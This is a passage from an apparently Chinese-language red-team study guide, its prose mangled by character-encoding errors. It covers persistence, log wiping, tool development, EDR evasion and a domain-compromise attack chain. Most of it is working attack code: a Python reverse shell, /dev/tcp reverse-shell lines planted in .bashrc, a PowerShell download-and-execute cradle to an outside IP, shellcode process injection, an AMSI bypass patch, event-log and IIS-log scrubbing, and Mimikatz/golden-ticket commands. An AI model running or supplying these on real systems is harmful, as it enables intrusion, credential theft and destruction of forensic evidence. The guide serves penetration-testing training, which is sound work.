# éšè”½ä»»åŠ¡ï¼ˆXMLå¯¼å…¥ï¼‰
schtasks /create /tn "GoogleUpdate" /xml task.xml
```

#### æœåŠ¡å®‰è£…

```powershell
# åˆ›å»ºæœåŠ¡
sc create "WindowsUpdate" binPath= "C:\backdoor.exe" start= auto
sc description "WindowsUpdate" "Windows Update Service"
sc start "WindowsUpdate"

# PowerShellåˆ›å»º
New-Service -Name "BackdoorSvc" -BinaryPathName "C:\backdoor.exe" -StartupType Automatic
```

#### WMIäº‹ä»¶è®¢é˜…

```powershell
# åˆ›å»ºWMIæŒä¹…åŒ–
$FilterArgs = @{
    name='SystemBootFilter'
    EventNameSpace='root\CimV2'
    QueryLanguage='WQL'
    Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
}
$Filter = Set-WmiInstance -Class __EventFilter -NameSpace "root\subscription" -Arguments $FilterArgs

$ConsumerArgs = @{
    name='SystemBootConsumer'
    CommandLineTemplate='powershell.exe -enc <base64>'
}
$Consumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace "root\subscription" -Arguments $ConsumerArgs

$FilterToConsumerArgs = @{
    Filter = $Filter
    Consumer = $Consumer
}
Set-WmiInstance -Class __FilterToConsumerBinding -Namespace "root\subscription" -Arguments $FilterToConsumerArgs
```

#### DLLåŠ«æŒ

```powershell
# æŸ¥æ‰¾å¯åŠ«æŒçš„DLL
# ä½¿ç”¨Process Monitorç›‘æ§ç¨‹åºåŠ è½½çš„DLL

# å¸¸è§åŠ«æŒç‚¹
# åº”ç”¨ç¨‹åºç›®å½•
# C:\Windows\System32
# PATHç¯å¢ƒå˜é‡ç›®å½•

# åˆ›å»ºæ¶æ„DLL
# DLLå¿…é¡»å¯¼å‡ºåŸDLLçš„æ‰€æœ‰å‡½æ•°
# åœ¨DllMainä¸­æ‰§è¡Œæ¶æ„ä»£ç 
```

### 6.2 LinuxæŒä¹…åŒ–

#### Crontab

```bash
# ç”¨æˆ·crontab
(crontab -l ; echo "*/5 * * * * /tmp/backdoor.sh") | crontab -

# ç³»ç»Ÿcrontab
echo "*/5 * * * * root /tmp/backdoor.sh" >> /etc/crontab

# cron.dç›®å½•
echo "*/5 * * * * root /tmp/backdoor.sh" > /etc/cron.d/backdoor
```

#### SSHå¯†é’¥

```bash
# æ·»åŠ å…¬é’¥
mkdir -p ~/.ssh
echo "ssh-rsa AAAA..." >> ~/.ssh/authorized_keys
chmod 600 ~/.ssh/authorized_keys

# ä¿®æ”¹sshdé…ç½®å…è®¸rootç™»å½•
echo "PermitRootLogin yes" >> /etc/ssh/sshd_config
systemctl restart sshd
```

#### å¯åŠ¨è„šæœ¬

```bash
# systemdæœåŠ¡
cat > /etc/systemd/system/backdoor.service <<EOF
[Unit]
Description=System Monitoring Service

[Service]
ExecStart=/tmp/backdoor.sh
Restart=always

[Install]
WantedBy=multi-user.target
EOF

systemctl enable backdoor.service
systemctl start backdoor.service

# rc.localï¼ˆä¼ ç»Ÿæ–¹æ³•ï¼‰
echo "/tmp/backdoor.sh &" >> /etc/rc.local
chmod +x /etc/rc.local
```

#### .bashrcåŠ«æŒ

```bash
# åœ¨ç”¨æˆ·.bashrcä¸­æ·»åŠ 
echo 'bash -i >& /dev/tcp/192.168.1.100/4444 0>&1 &' >> ~/.bashrc

# åœ¨/etc/bash.bashrcä¸­æ·»åŠ ï¼ˆå½±å“æ‰€æœ‰ç”¨æˆ·ï¼‰
echo 'bash -i >& /dev/tcp/192.168.1.100/4444 0>&1 &' >> /etc/bash.bashrc
```

---

## 7. ç—•è¿¹æ¸…ç†

### 7.1 Windowsæ—¥å¿—æ¸…ç†

#### äº‹ä»¶æ—¥å¿—æ¸…ç†

```powershell
# æ¸…é™¤æ‰€æœ‰äº‹ä»¶æ—¥å¿—
wevtutil cl System
wevtutil cl Security
wevtutil cl Application

# PowerShellæ¸…é™¤
Get-EventLog -LogName * | ForEach { Clear-EventLog $_.Log }

# åˆ é™¤ç‰¹å®šäº‹ä»¶
Get-WinEvent -FilterHashtable @{LogName='Security';ID=4624} | Remove-WinEvent

# ä½¿ç”¨å·¥å…·
# Invoke-Phant0m: ç»ˆæ­¢EventLogçº¿ç¨‹
# Phantom: æ— ç—•æ¸…ç†å·¥å…·
```

#### IISæ—¥å¿—æ¸…ç†

```powershell
# IISæ—¥å¿—ä½ç½®
# C:\inetpub\logs\LogFiles\

# åˆ é™¤åŒ…å«æ”»å‡»IPçš„æ—¥å¿—è¡Œ
$ip = "192.168.1.100"
Get-ChildItem C:\inetpub\logs\LogFiles -Recurse -Filter *.log | ForEach {
    (Get-Content $_.FullName) | Where-Object { $_ -notmatch $ip } | Set-Content $_.FullName
}
```

#### æ•°æ®åº“æ—¥å¿—

```sql
-- MySQLæ—¥å¿—æ¸…ç†
SET GLOBAL general_log = 'OFF';
TRUNCATE TABLE mysql.general_log;

-- MSSQLæ—¥å¿—æ¸…ç†
EXEC sp_cycle_errorlog;
DBCC SHRINKFILE (ErrorLog, 1);
```

### 7.2 æ–‡ä»¶ç—•è¿¹æ¸…ç†

#### ä¸´æ—¶æ–‡ä»¶æ¸…ç†

```powershell
# æ¸…ç†ä¸´æ—¶ç›®å½•
Remove-Item $env:TEMP\* -Recurse -Force
Remove-Item C:\Windows\Temp\* -Recurse -Force

# æ¸…ç†é¢„è¯»å–æ–‡ä»¶
Remove-Item C:\Windows\Prefetch\* -Force

# æ¸…ç†æœ€è¿‘æ–‡ä»¶
Remove-Item "$env:APPDATA\Microsoft\Windows\Recent\*" -Force
```

#### æ—¶é—´æˆ³ä¿®æ”¹

```powershell
# ä¿®æ”¹æ–‡ä»¶æ—¶é—´æˆ³
$(Get-Item file.exe).CreationTime = "2020-01-01 12:00:00"
$(Get-Item file.exe).LastWriteTime = "2020-01-01 12:00:00"
$(Get-Item file.exe).LastAccessTime = "2020-01-01 12:00:00"

# ä½¿ç”¨timestompï¼ˆMetasploitï¼‰
meterpreter > timestomp file.exe -v
meterpreter > timestomp file.exe -m "2020-01-01 12:00:00"
```

#### å®‰å…¨åˆ é™¤æ–‡ä»¶

```bash
# Windows - SDelete
sdelete.exe -p 7 file.exe

# Linux - shred
shred -vfz -n 10 file.txt

# è¦†ç›–å¼åˆ é™¤
dd if=/dev/urandom of=file.txt bs=1M count=10
rm file.txt
```

### 7.3 Linuxæ—¥å¿—æ¸…ç†

```bash
# æ¸…ç©ºæ—¥å¿—æ–‡ä»¶
cat /dev/null > /var/log/auth.log
cat /dev/null > /var/log/syslog
cat /dev/null > ~/.bash_history

# åˆ é™¤ç‰¹å®šIPçš„æ—¥å¿—
sed -i '/192.168.1.100/d' /var/log/auth.log

# æ¸…é™¤history
history -c
history -w
unset HISTFILE

# ç¦ç”¨historyè®°å½•
export HISTSIZE=0
export HISTFILESIZE=0
```

---

## 8. å†…ç½‘æ¸—é€å·¥å…·å¼€å‘

### 8.1 Pythonè„šæœ¬å¼€å‘

#### ç«¯å£æ‰«æå™¨

```python
import socket
import threading
from queue import Queue

def port_scan(host, port):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(1)
        result = sock.connect_ex((host, port))
        if result == 0:
            try:
                service = socket.getservbyport(port)
            except:
                service = "Unknown"
            print(f"[+] {host}:{port} - {service}")
        sock.close()
    except:
        pass

def worker(host, queue):
    while not queue.empty():
        port = queue.get()
        port_scan(host, port)
        queue.task_done()

def scan(host, ports):
    queue = Queue()
    for port in ports:
        queue.put(port)

    for _ in range(100):  # 100ä¸ªçº¿ç¨‹
        t = threading.Thread(target=worker, args=(host, queue))
        t.daemon = True
        t.start()

    queue.join()

# ä½¿ç”¨ç¤ºä¾‹
scan("192.168.1.10", range(1, 65536))
```

#### ç®€æ˜“åå¼¹Shell

```python
import socket
import subprocess
import os

def reverse_shell(ip, port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((ip, port))

    while True:
        command = s.recv(1024).decode()
        if command.lower() == 'exit':
            break

        if command[:2] == 'cd':
            os.chdir(command[3:])
            s.send(b'Changed directory\n')
        else:
            output = subprocess.getoutput(command)
            s.send(output.encode() + b'\n')

    s.close()

# ä½¿ç”¨
reverse_shell('192.168.1.100', 4444)
```

### 8.2 PowerShellè„šæœ¬å¼€å‘

#### ä¿¡æ¯æ”¶é›†è„šæœ¬

```powershell
function Get-SystemInfo {
    $info = @{}

    # ç³»ç»Ÿä¿¡æ¯
    $info['Hostname'] = $env:COMPUTERNAME
    $info['Username'] = $env:USERNAME
    $info['Domain'] = $env:USERDOMAIN
    $info['OS'] = (Get-WmiObject Win32_OperatingSystem).Caption

    # ç½‘ç»œä¿¡æ¯
    $info['IP'] = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object {$_.InterfaceAlias -notlike "*Loopback*"}).IPAddress
    $info['Gateway'] = (Get-NetRoute -DestinationPrefix 0.0.0.0/0).NextHop

    # æ€è½¯æ£€æµ‹
    $av = Get-WmiObject -Namespace "root\SecurityCenter2" -Class AntiVirusProduct
    $info['AntiVirus'] = $av.displayName

    # å½“å‰æƒé™
    $info['IsAdmin'] = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)

    return $info
}

# å¯¼å‡ºç»“æœ
Get-SystemInfo | ConvertTo-Json | Out-File info.json
```

#### å†…å­˜æ‰§è¡Œè„šæœ¬

```powershell
# Invoke-Expressionä»å†…å­˜æ‰§è¡Œ
IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.100/script.ps1')

# Bypassæ‰§è¡Œç­–ç•¥
powershell.exe -ExecutionPolicy Bypass -File script.ps1
powershell.exe -ep bypass -c "IEX (Get-Content script.ps1 -Raw)"

# ç¼–ç æ‰§è¡Œ
$command = 'Write-Host "Hello"'
$bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
$encodedCommand = [Convert]::ToBase64String($bytes)
powershell.exe -encodedCommand $encodedCommand
```

### 8.3 C/C++å·¥å…·å¼€å‘

#### è¿›ç¨‹æ³¨å…¥

```cpp
#include <windows.h>
#include <stdio.h>

// Shellcode (calc.exe)
unsigned char shellcode[] =
    "\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00...";

int main(int argc, char* argv[]) {
    DWORD pid = atoi(argv[1]);

    // æ‰“å¼€ç›®æ ‡è¿›ç¨‹
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);

    // åœ¨ç›®æ ‡è¿›ç¨‹ä¸­åˆ†é…å†…å­˜
    LPVOID pRemoteCode = VirtualAllocEx(hProcess, NULL, sizeof(shellcode),
                                        MEM_COMMIT, PAGE_EXECUTE_READWRITE);

    // å†™å…¥shellcode
    WriteProcessMemory(hProcess, pRemoteCode, shellcode, sizeof(shellcode), NULL);

    // åˆ›å»ºè¿œç¨‹çº¿ç¨‹
    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0,
                                       (LPTHREAD_START_ROUTINE)pRemoteCode,
                                       NULL, 0, NULL);

    WaitForSingleObject(hThread, INFINITE);

    CloseHandle(hThread);
    CloseHandle(hProcess);

    return 0;
}
```

---

## 9. é˜²å¾¡å¯¹æŠ—æŠ€æœ¯

### 9.1 EDRç»•è¿‡

#### è¿›ç¨‹æ³¨å…¥æŠ€æœ¯

**ç»å…¸æ³¨å…¥**:
```cpp
// 1. CreateRemoteThreadæ³¨å…¥
// 2. APCæ³¨å…¥
// 3. Process Hollowing
// 4. Reflective DLLæ³¨å…¥
```

**è¿›ç¨‹è¿ç§»ï¼ˆMeterpreterï¼‰**:
```bash
meterpreter > ps
meterpreter > migrate 1234  # è¿ç§»åˆ°åˆæ³•è¿›ç¨‹
```

#### å†…å­˜åŠ è½½

**PowerShell Reflection**:
```powershell
# ä»å†…å­˜åŠ è½½.NETç¨‹åºé›†
$bytes = [System.IO.File]::ReadAllBytes("C:\assembly.dll")
[System.Reflection.Assembly]::Load($bytes)
[Namespace.Class]::Method()

# åŠ è½½PEæ–‡ä»¶åˆ°å†…å­˜
Invoke-ReflectivePEInjection -PEBytes $bytes -ProcId 1234
```

**C# Assembly Execute**:
```csharp
byte[] assemblyBytes = File.ReadAllBytes("payload.dll");
Assembly assembly = Assembly.Load(assemblyBytes);
MethodInfo method = assembly.EntryPoint;
method.Invoke(null, null);
```

#### API Hookç»•è¿‡

```cpp
// ç›´æ¥ç³»ç»Ÿè°ƒç”¨
// ç»•è¿‡ç”¨æˆ·æ€Hook
NTSTATUS NtCreateFile(...) {
    // ç›´æ¥è°ƒç”¨syscall
    __asm {
        mov r10, rcx
        mov eax, 0x55  // NtCreateFile syscall number
        syscall
        ret
    }
}
```

### 9.2 AV/EDRæ£€æµ‹è§„é¿

#### æ··æ·†æŠ€æœ¯

```powershell
# å­—ç¬¦ä¸²æ··æ·†
$a = 'I'+'EX'
& $a (New-Object Net.WebClient).DownloadString('http://...')

# Base64ç¼–ç 
$command = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($script))
powershell.exe -enc $command

# XORåŠ å¯†
$key = 0x42
$encrypted = $shellcode | ForEach-Object { $_ -bxor $key }
```

#### AMSIç»•è¿‡

```powershell
# AMSIå†…å­˜Patch
$a=[Ref].Assembly.GetTypes();
Foreach($b in $a) {
    if ($b.Name -like "*iUtils") {
        $c=$b
    }
};
$d=$c.GetFields('NonPublic,Static');
Foreach($e in $d) {
    if ($e.Name -like "*Context") {
        $f=$e
    }
};
$g=$f.GetValue($null);
[IntPtr]$ptr=$g;
[Int32[]]$buf = @(0);
[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)

# ç®€åŒ–ç‰ˆ
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

---

## 10. å®æˆ˜æ”»å‡»é“¾æ¡ˆä¾‹

### 10.1 å®Œæ•´æ”»å‡»é“¾ç¤ºä¾‹

**åœºæ™¯**: ä»å¤–ç½‘WebæœåŠ¡å™¨æ¸—é€åˆ°å†…ç½‘åŸŸæ§

**é˜¶æ®µ1: å¤–ç½‘çªç ´**
```bash
# 1. ä¿¡æ¯æ”¶é›†
nmap -sV target.com
whatweb target.com
dirsearch -u http://target.com

# 2. æ¼æ´åˆ©ç”¨ï¼ˆå‡è®¾å­˜åœ¨æ–‡ä»¶ä¸Šä¼ æ¼æ´ï¼‰
# ä¸Šä¼ Webshell

# 3. è·å¾—åˆå§‹Shell
nc -lvnp 4444
```

**é˜¶æ®µ2: å†…ç½‘ä¿¡æ¯æ”¶é›†**
```powershell
# è·å–ç³»ç»Ÿä¿¡æ¯
systeminfo
ipconfig /all
net user
net localgroup administrators

# æŸ¥çœ‹åŸŸç¯å¢ƒ
net view /domain
net group "Domain Controllers" /domain
nltest /dclist:

# ç«¯å£æ‰«æå†…ç½‘
for /L %i in (1,1,254) do @ping -n 1 -w 100 192.168.1.%i | find "TTL="
```

**é˜¶æ®µ3: æƒé™æå‡**
```powershell
# ä½¿ç”¨PowerUpæ£€æŸ¥ææƒç‚¹
Invoke-AllChecks

# åˆ©ç”¨æœåŠ¡æƒé™ææƒ
sc config vulnerable_service binPath= "cmd.exe /c net localgroup administrators user /add"
sc stop vulnerable_service
sc start vulnerable_service
```

**é˜¶æ®µ4: å‡­è¯è·å–**
```powershell
# Mimikatzæå–å¯†ç 
privilege::debug
sekurlsa::logonpasswords

# æå–åˆ°åŸŸç”¨æˆ·å‡­è¯
# domain\user : Password123!
```

**é˜¶æ®µ5: æ¨ªå‘ç§»åŠ¨**
```bash
# ä½¿ç”¨è·å–çš„å‡­è¯æ¨ªå‘åˆ°å…¶ä»–ä¸»æœº
psexec.py domain/user:Password123!@192.168.1.20

# ç»§ç»­æ”¶é›†å‡­è¯
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
```

**é˜¶æ®µ6: åŸŸæ§åˆ¶å™¨æ”»å‡»**
```bash
# Kerberoastingæ”»å‡»
GetUserSPNs.py -request -dc-ip 192.168.1.10 domain/user:password

# è·å–åˆ°åŸŸç®¡ç†å‘˜æƒé™å
psexec.py domain/admin:password@192.168.1.10
```

**é˜¶æ®µ7: æŒä¹…åŒ–**
```powershell
# åˆ›å»ºåŸŸç”¨æˆ·
net user backdoor Password123! /add /domain
net group "Domain Admins" backdoor /add /domain

# é»„é‡‘ç¥¨æ®
mimikatz "lsadump::dcsync /domain:domain.com /user:krbtgt"
mimikatz "kerberos::golden /user:Administrator /domain:domain.com /sid:S-1-5-21-xxx /krbtgt:hash /ptt"
```

### 10.2 çº¢è“å¯¹æŠ—åœºæ™¯

#### çº¢é˜Ÿæ”»å‡»ç­–ç•¥

**åˆå§‹è®¿é—®**:
- é’“é±¼é‚®ä»¶ + Officeå®
- ä¾›åº”é“¾æ”»å‡»
- VPNå¼±å¯†ç çˆ†ç ´
- 0dayæ¼æ´åˆ©ç”¨

**æŒä¹…åŒ–ç­–ç•¥**:
- å¤šé‡æŒä¹…åŒ–ç‚¹
- éšè”½é€šä¿¡é€šé“
- å¤‡ç”¨C2æœåŠ¡å™¨
- äº‘ç«¯èµ„æºåˆ©ç”¨

**æ¨ªå‘ç§»åŠ¨è·¯å¾„**:
```
WebæœåŠ¡å™¨ -> è·³æ¿æœº -> å†…ç½‘PC -> æœåŠ¡å™¨ -> åŸŸæ§
```

#### è“é˜Ÿé˜²å¾¡ç­–ç•¥

**æ£€æµ‹ç‚¹éƒ¨ç½²**:
- ç½‘ç»œæµé‡åˆ†æï¼ˆIDS/IPSï¼‰
- ç«¯ç‚¹æ£€æµ‹å“åº”ï¼ˆEDRï¼‰
- æ—¥å¿—é›†ä¸­åˆ†æï¼ˆSIEMï¼‰
- èœœç½ç³»ç»Ÿéƒ¨ç½²

**å“åº”æªæ–½**:
```bash
# 1. éš”ç¦»å—æ„ŸæŸ“ä¸»æœº
# 2. é˜»æ–­C2é€šä¿¡
# 3. æ”¶é›†å–è¯æ•°æ®
# 4. åˆ†ææ”»å‡»æ‰‹æ³•
# 5. ä¿®å¤æ¼æ´
# 6. æ¢å¤ä¸šåŠ¡
```

---

## 11. å­¦ä¹ éªŒè¯æ ‡å‡†

### âœ… é˜¶æ®µä¸€ï¼šåŸºç¡€å»ºç«‹ï¼ˆ1-2ä¸ªæœˆï¼‰
- [ ] ç†Ÿæ‚‰å†…ç½‘æ‹“æ‰‘ç»“æ„å’Œå¸¸è§ç½‘ç»œæ¶æ„
- [ ] æŒæ¡Nmapã€Masscanç­‰æ‰«æå·¥å…·
- [ ] ç†è§£Windowså’ŒLinuxæƒé™æ¨¡å‹
- [ ] èƒ½å¤Ÿæ­å»ºåŸŸç¯å¢ƒæµ‹è¯•å®éªŒå®¤
- [ ] å®ŒæˆOSCP/HTB 10å°é¶æœº

### âœ… é˜¶æ®µäºŒï¼šæŠ€èƒ½æå‡ï¼ˆ3-4ä¸ªæœˆï¼‰
- [ ] æŒæ¡5ç§ä»¥ä¸Šæ¨ªå‘ç§»åŠ¨æŠ€æœ¯
- [ ] èƒ½å¤Ÿè¿›è¡ŒKerberosæ”»å‡»ï¼ˆKerberoastingã€Golden Ticketï¼‰
- [ ] ç†Ÿç»ƒä½¿ç”¨Mimikatzã€BloodHoundç­‰å·¥å…·
- [ ] ç¼–å†™è‡ªåŠ¨åŒ–æ¸—é€è„šæœ¬
- [ ] å®ŒæˆåŸŸæ¸—é€CTFæŒ‘æˆ˜

### âœ… é˜¶æ®µä¸‰ï¼šå®æˆ˜åº”ç”¨ï¼ˆ5-6ä¸ªæœˆï¼‰
- [ ] ç‹¬ç«‹å®Œæˆå®Œæ•´å†…ç½‘æ¸—é€é¡¹ç›®
- [ ] ç»•è¿‡EDR/AVé˜²æŠ¤
- [ ] å¼€å‘è‡ªå®šä¹‰æ¸—é€å·¥å…·
- [ ] å‚ä¸çº¢è“å¯¹æŠ—æ¼”ç»ƒ
- [ ] é€šè¿‡OSCP/OSEPè®¤è¯

---

## 12. å®æˆ˜ç¯å¢ƒæ¨è

### åœ¨çº¿é¶åœº
- **HackTheBox**: Active Directoryé¶æœº
- **VulnHub**: å†…ç½‘æ¸—é€ç³»åˆ—é¶æœº
- **GOAD**: æ¸¸æˆåŒ–ADç¯å¢ƒ
- **PentesterAcademy**: çº¢é˜Ÿå®éªŒå®¤

### æœ¬åœ°æ­å»º

**åŸŸç¯å¢ƒæ­å»º**:
```powershell
# Windows Server 2019 (åŸŸæ§)
Install-WindowsFeature AD-Domain-Services -IncludeManagementTools
Install-ADDSForest -DomainName "lab.local"

# Windows 10 (åŸŸæˆå‘˜)
Add-Computer -DomainName "lab.local" -Credential (Get-Credential)
Restart-Computer

# åˆ›å»ºæµ‹è¯•ç”¨æˆ·
New-ADUser -Name "testuser" -AccountPassword (ConvertTo-SecureString "Password123!" -AsPlainText -Force) -Enabled $true
```

**é¶åœºæ¨èé…ç½®**:
```
1å°åŸŸæ§ (Windows Server 2019)
2å°åŸŸæˆå‘˜æœº (Windows 10)
1å°WebæœåŠ¡å™¨ (Ubuntu + DVWA)
1å°æ•°æ®åº“æœåŠ¡å™¨ (Windows + MSSQL)
1å°Kaliæ”»å‡»æœº
```

---

## 13. æ‰©å±•å­¦ä¹ èµ„æº

### ğŸ“š æ¨èä¹¦ç±
1. **ã€Šå†…ç½‘å®‰å…¨æ”»é˜²ã€‹** - ç³»ç»ŸåŒ–å†…ç½‘æ¸—é€çŸ¥è¯†
2. **ã€Šæ¸—é€æµ‹è¯•å®è·µæŒ‡å—ï¼ˆç¬¬3ç‰ˆï¼‰ã€‹** - ç»å…¸å¿…è¯»
3. **ã€ŠActive Directoryå®‰å…¨æŒ‡å—ã€‹** - ADå®‰å…¨æ·±åº¦è§£æ
4. **ã€ŠPowerShellæ”»é˜²å®æˆ˜ã€‹** - PowerShellæ¸—é€æŠ€å·§

### ğŸ“ åœ¨çº¿è¯¾ç¨‹
- SANS SEC560: Network Penetration Testing
- Offensive Security: PEN-300 (OSEP)
- Pentester Academy: Red Team Lab
- eLearnSecurity: eCPTXv2

### ğŸ”§ å¿…å¤‡å·¥å…·é›†

**ä¿¡æ¯æ”¶é›†**:
```bash
nmap, masscan, crackmapexec, bloodhound,
sharphound, adrecon, powerView
```

**æ¼æ´åˆ©ç”¨**:
```bash
metasploit, empire, covenant, sliver,
impacket, crackmapexec
```

**æƒé™æå‡**:
```bash
winpeas, linpeas, powerup, powerless,
beroot, linux-exploit-suggester
```

**å‡­è¯è·å–**:
```bash
mimikatz, lazagne, pypykatz, secretsdump,
rubeus, kerberoast
```

**æ¨ªå‘ç§»åŠ¨**:
```bash
psexec, wmiexec, smbexec, evil-winrm,
chisel, frp, proxychains
```

### ğŸ“° å®‰å…¨èµ„è®¯ä¸ç¤¾åŒº
- **Pentester Blog**: å†…ç½‘æ¸—é€æŠ€å·§åˆ†äº«
- **SpecterOps**: çº¢é˜Ÿæˆ˜æœ¯ç ”ç©¶
- **HarmJ0y Blog**: ADå®‰å…¨ç ”ç©¶
- **Red Team Notes**: çº¢é˜Ÿç¬”è®°
- **MITRE ATT&CK**: æ”»å‡»æˆ˜æœ¯çŸ¥è¯†åº“

---

## 14. èŒä¸šå‘å±•è·¯å¾„

### åˆçº§æ¸—é€æµ‹è¯•å·¥ç¨‹å¸ˆï¼ˆ0-2å¹´ï¼‰
- æŒæ¡åŸºç¡€å†…ç½‘æ¸—é€æŠ€æœ¯
- ç†Ÿç»ƒä½¿ç”¨ä¸»æµæ¸—é€å·¥å…·
- èƒ½å¤Ÿå®Œæˆæ ‡å‡†åŒ–æ¸—é€æµ‹è¯•
- ç¼–å†™åˆæ ¼çš„æ¸—é€æµ‹è¯•æŠ¥å‘Š

### ä¸­çº§çº¢é˜Ÿå·¥ç¨‹å¸ˆï¼ˆ2-5å¹´ï¼‰
- ç‹¬ç«‹å®Œæˆå¤æ‚å†…ç½‘æ¸—é€é¡¹ç›®
- èƒ½å¤Ÿç»•è¿‡ä¸»æµå®‰å…¨é˜²æŠ¤
- å¼€å‘è‡ªå®šä¹‰æ”»å‡»å·¥å…·
- å‚ä¸APTæ”»å‡»æ¨¡æ‹Ÿ

### é«˜çº§çº¢é˜Ÿä¸“å®¶ï¼ˆ5å¹´ä»¥ä¸Šï¼‰
- è®¾è®¡å¤æ‚çº¢é˜Ÿè¡ŒåŠ¨æ–¹æ¡ˆ
- ç ”ç©¶0dayæ¼æ´å’Œé«˜çº§åˆ©ç”¨æŠ€æœ¯
- å¸¦é¢†å›¢é˜Ÿå®Œæˆå¤§å‹æ¼”ç»ƒ
- åˆ¶å®šä¼ä¸šå®‰å…¨é˜²å¾¡ç­–ç•¥

---

## 15. 60å¤©ç³»ç»Ÿå­¦ä¹ è®¡åˆ’

### ç¬¬1-2å‘¨: åŸºç¡€å»ºè®¾
- æ­å»ºå®éªŒç¯å¢ƒï¼ˆåŸŸç¯å¢ƒ + é¶æœºï¼‰
- å­¦ä¹ ç½‘ç»œåè®®å’Œæ“ä½œç³»ç»ŸåŸç†
- ç†Ÿæ‚‰Nmapã€MetasploitåŸºç¡€æ“ä½œ
- å®ŒæˆHackTheBox 3å°ç®€å•é¶æœº

### ç¬¬3-4å‘¨: ä¿¡æ¯æ”¶é›†
- ä¸»æœºå‘ç°å’Œç«¯å£æ‰«ææŠ€æœ¯
- åŸŸç¯å¢ƒä¿¡æ¯æ”¶é›†æ–¹æ³•
- BloodHoundä½¿ç”¨å’Œè·¯å¾„åˆ†æ
- å®ŒæˆåŸŸç¯å¢ƒä¿¡æ¯æ”¶é›†å®éªŒ

### ç¬¬5-6å‘¨: æ¼æ´åˆ©ç”¨
- å¸¸è§å†…ç½‘æœåŠ¡æ¼æ´åˆ©ç”¨
- Webåº”ç”¨æ¼æ´åˆ°å†…ç½‘çªç ´
- Metasploitæ¨¡å—å¼€å‘
- å®Œæˆ5ä¸ªæ¼æ´åˆ©ç”¨ç»ƒä¹ 

### ç¬¬7-8å‘¨: æƒé™æå‡
- Windowsæƒé™æå‡å…¨æŠ€æœ¯
- Linuxæƒé™æå‡æ–¹æ³•
- è‡ªåŠ¨åŒ–ææƒè„šæœ¬ä½¿ç”¨
- å®Œæˆ10ä¸ªææƒé¶æœº

### ç¬¬9-12å‘¨: æ¨ªå‘ç§»åŠ¨ä¸æŒä¹…åŒ–
- Pass-the-Hash/Ticketæ”»å‡»
- Kerberosæ”»å‡»æŠ€æœ¯
- éš§é“æŠ€æœ¯å®æˆ˜
- æŒä¹…åŒ–æœºåˆ¶éƒ¨ç½²
- å®Œæˆå®Œæ•´æ”»å‡»é“¾æ¼”ç»ƒ

### ç¬¬13-14å‘¨: å¯¹æŠ—ä¸å…æ€
- AV/EDRç»•è¿‡æŠ€æœ¯
- å†…å­˜æ‰§è¡Œå’Œè¿›ç¨‹æ³¨å…¥
- æ··æ·†å’ŒåŠ å¯†æŠ€æœ¯
- è‡ªå®šä¹‰å·¥å…·å¼€å‘

### ç¬¬15-16å‘¨: ç»¼åˆå®æˆ˜
- å®Œæ•´çº¢é˜Ÿé¡¹ç›®æ¨¡æ‹Ÿ
- ç¼–å†™è¯¦ç»†æ¸—é€æŠ¥å‘Š
- æ€»ç»“ç»éªŒå’ŒçŸ¥è¯†æ¢³ç†
- å‡†å¤‡OSCPè®¤è¯

---

## âš ï¸ å®‰å…¨æé†’

1. **æ³•å¾‹ç¬¬ä¸€**: æ‰€æœ‰æŠ€æœ¯ä»…ç”¨äºæˆæƒæµ‹è¯•
2. **ä¿å¯†ä¹‰åŠ¡**: ä¸¥æ ¼ä¿æŠ¤å®¢æˆ·æ•°æ®å’Œæµ‹è¯•ç»“æœ
3. **æœ€å°å½±å“**: é¿å…å¯¹ç”Ÿäº§ç¯å¢ƒé€ æˆç ´å
4. **åŠæ—¶æ²Ÿé€š**: å‘ç°é«˜å±æ¼æ´ç«‹å³æŠ¥å‘Š
5. **æŒç»­å­¦ä¹ **: æ”»é˜²æŠ€æœ¯ä¸æ–­æ¼”è¿›ï¼Œä¿æŒå­¦ä¹ çŠ¶æ€

---

## ğŸ“ æ€»ç»“

å†…ç½‘æ¸—é€æ˜¯ä¿¡æ¯å®‰å…¨é¢†åŸŸçš„é«˜çº§æŠ€æœ¯æ–¹å‘ï¼Œéœ€è¦æ‰å®çš„åŸºç¡€çŸ¥è¯†å’Œå¤§é‡çš„å®è·µç»éªŒã€‚æœ¬æŒ‡å—æä¾›äº†ç³»ç»ŸåŒ–çš„å­¦ä¹ è·¯å¾„ï¼Œä½†çœŸæ­£çš„æŠ€èƒ½æå‡éœ€è¦ï¼š

1. **æ·±å…¥ç†è§£**: ä¸ä»…çŸ¥é“æ€ä¹ˆåšï¼Œæ›´è¦ç†è§£ä¸ºä»€ä¹ˆ
2. **å¤§é‡å®è·µ**: ç†è®ºå¿…é¡»ç»“åˆé¶åœºå’Œå®æˆ˜æ¼”ç»ƒ
3. **ä¸¾ä¸€åä¸‰**: ä»å•ä¸ªæŠ€æœ¯æ‰©å±•åˆ°å®Œæ•´æ”»å‡»é“¾
4. **å¯¹æŠ—æ€ç»´**: ç†è§£è“é˜Ÿé˜²å¾¡ï¼Œæå‡çº¢é˜Ÿèƒ½åŠ›
5. **é“å¾·åº•çº¿**: æŠ€æœ¯æ˜¯ä¸ºäº†å®‰å…¨é˜²å¾¡ï¼Œè€Œéæ¶æ„ç ´å

è®°ä½ï¼šä¼˜ç§€çš„å†…ç½‘æ¸—é€å·¥ç¨‹å¸ˆä¸ä»…æ˜¯æŠ€æœ¯ä¸“å®¶ï¼Œæ›´æ˜¯å…·æœ‰èŒä¸šé“å¾·å’Œæ³•å¾‹æ„è¯†çš„å®‰å…¨ä»ä¸šè€…ã€‚

